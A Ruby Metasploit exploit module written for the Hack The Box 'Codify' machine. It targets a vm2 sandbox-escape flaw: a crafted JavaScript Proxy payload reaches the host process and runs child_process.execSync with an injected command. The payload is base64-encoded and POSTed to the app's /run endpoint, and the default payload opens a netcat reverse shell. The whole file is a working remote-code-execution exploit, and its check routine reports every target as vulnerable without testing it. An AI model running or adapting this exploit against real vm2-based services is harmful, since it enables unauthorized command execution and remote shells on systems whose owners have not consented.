##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Exploit::Remote::HttpClient
  # include Msf::Exploit::Remote::HttpServer  # https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Hackthebox Codify',
        'Description' => %q{
          This exploit module is used to gain foothold access to 
          Hackthebox's Codify machine.
        },
        'License' => MSF_LICENSE,
        'Author' => ['ClutchReboot'],
        'References' => [
          [ 'URL', 'https://www.hackthebox.com/machines/codify'],
          [ 'Vulnerability', 'https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m' ]
        ],
        'Payload' => {
          'BadChars' => "\x00"
        },
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ]
        ],
        'DisclosureDate' => '2023-11-04',
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget' => 0,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def execute_command(cmd, _opts = {})
    exploit_code = "err = {};
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };
      
    const proxiedErr = new Proxy(err, handler);
    try {
        throw proxiedErr;
    } catch ({constructor: c}) {
        c.constructor('return process')().mainModule.require('child_process').execSync(\"#{cmd}\");
    }"

    send_request_cgi({
      'method' => 'POST',
      'uri' => '/run',
      'ctype' => 'application/json',
      'data' => JSON.generate({
        'code': Rex::Text.encode_base64(exploit_code)
      })
    })
  end

  def check
    CheckCode::Vulnerable
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
      when :unix_cmd
        execute_command(payload.encoded)
      end

  end
end
  
